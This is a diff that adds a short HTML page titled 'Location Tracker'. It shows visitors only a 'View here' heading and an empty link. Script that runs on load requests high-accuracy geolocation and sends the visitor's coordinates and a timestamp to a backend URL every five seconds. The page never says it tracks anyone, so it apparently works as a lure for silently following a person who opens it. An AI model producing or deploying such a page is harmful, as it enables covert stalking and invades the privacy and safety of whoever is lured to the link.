@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Tracker</title>
+</head>
+<body>
+  <h1>View here</h1>
+  <a herf="https://masterutsav.in"></a>
+
+  <script>
+    const backendUrl = 'https://your-backend-url.com/track-location'; // Replace with your backend URL
+
+    // Function to send location data to the backend
+    async function sendLocationData(latitude, longitude) {
+      const timestamp = Date.now();
+      try {
+        await fetch(backendUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude, timestamp }),
+        });
+        console.log('Location sent:', { latitude, longitude, timestamp });
+      } catch (error) {
+        console.error('Failed to send location:', error);
+      }
+    }
+
+    // Function to fetch and send the user's location every 5 seconds
+    function startTrackingLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            console.log(`Initial location: Latitude: ${latitude}, Longitude: ${longitude}`);
+            sendLocationData(latitude, longitude);
+
+            // Use setInterval to fetch location every 5 seconds
+            setInterval(() => {
+              navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  const { latitude, longitude } = position.coords;
+                  console.log(`Updated location: Latitude: ${latitude}, Longitude: ${longitude}`);
+                  sendLocationData(latitude, longitude);
+                },
+                (error) => {
+                  console.error('Error fetching location:', error);
+                },
+                { enableHighAccuracy: true }
+              );
+            }, 5000); // Fetch every 5 seconds
+          },
+          (error) => {
+            console.error('Error getting initial location:', error);
+          },
+          { enableHighAccuracy: true }
+        );
+      } else {
+        alert('Geolocation is not supported by this browser.');
+      }
+    }
+
+    // Start tracking location when the page loads
+    window.onload = startTrackingLocation;
+  </script>
+</body>
+</html>
